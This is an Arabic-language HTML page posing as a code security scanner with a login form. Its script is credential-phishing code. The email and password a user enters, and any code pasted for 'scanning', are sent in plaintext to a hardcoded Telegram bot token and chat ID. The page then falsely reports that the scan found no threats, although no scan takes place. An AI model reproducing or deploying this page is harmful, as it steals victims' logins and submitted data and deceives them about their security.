<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🛡️ نظام جواد الاحترافي</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        input, textarea { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
        textarea { color: #39ff14; font-family: monospace; resize: none; }
        .btn-main { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; margin-bottom: 10px; }
        .btn-guest { width: 100%; padding: 10px; background: transparent; color: #58a6ff; border: 1px solid #58a6ff; border-radius: 6px; cursor: pointer; font-size: 14px; }
        h2 { color: #58a6ff; margin-bottom: 20px; }
    </style>
</head>
<body>

<div id="app">
    </div>

<script>
    const BOT_TOKEN = "8648545262:AAEqXqGrARHdBgwolI9ny0qM3B0gvKEkE04";
    const CHAT_ID = "8270719098";

    // دالة لعرض صفحة الدخول
    function showLoginPage() {
        document.getElementById('app').innerHTML = `
            <div class="card">
                <h2>🛡️ دخول النظام</h2>
                <p style="color: #8b949e;">يرجى تسجيل الدخول للبدء</p>
                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
                <input type="password" id="password" placeholder="كلمة المرور" required>
                <button class="btn-main" onclick="handleLogin('user')">دخول</button>
                <button class="btn-guest" onclick="handleLogin('guest')">الدخول كضيف 👤</button>
            </div>
        `;
    }

    // دالة لعرض صفحة الفحص (الصفحة الثانية)
    function showScanPage() {
        document.getElementById('app').innerHTML = `
            <div class="card">
                <h2>🛡️ فحص الحماية</h2>
                <p style="color: #8b949e;">أدخل الكود لتحليله أمنياً</p>
                <textarea id="codeToScan" placeholder="الصق الكود هنا..." rows="5"></textarea>
                <button class="btn-main" onclick="handleScan()">بدء الفحص 🔍</button>
                <p onclick="logout()" style="color:#f85149; cursor:pointer; font-size:12px;">تسجيل الخروج</p>
            </div>
        `;
    }

    // التعامل مع الدخول
    async function handleLogin(type) {
        if (type === 'user') {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            if(!email || !pass) return alert("املا البيانات يا بطل");
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔑 دخول مستخدم:\n📧 " + email + "\n🔑 " + pass)}`);
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("👤 دخول كضيف")}`);
        }
        
        // حفظ الحالة في المتصفح (زي السيشين في بايثون)
        localStorage.setItem('isLoggedIn', 'true');
        showScanPage();
    }

    // التعامل مع الفحص
    async function handleScan() {
        const content = document.getElementById('codeToScan').value;
        if(!content) return alert("فين الكود؟");
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔍 فحص جديد:\n" + content)}`);
        alert("✅ اكتمل الفحص! لم يتم العثور على تهديدات.");
    }

    // تسجيل الخروج
    function logout() {
        localStorage.removeItem('isLoggedIn');
        showLoginPage();
    }

    // تشغيل النظام عند فتح الصفحة
    if (localStorage.getItem('isLoggedIn') === 'true') {
        showScanPage();
    } else {
        showLoginPage();
    }
</script>

</body>
</html>
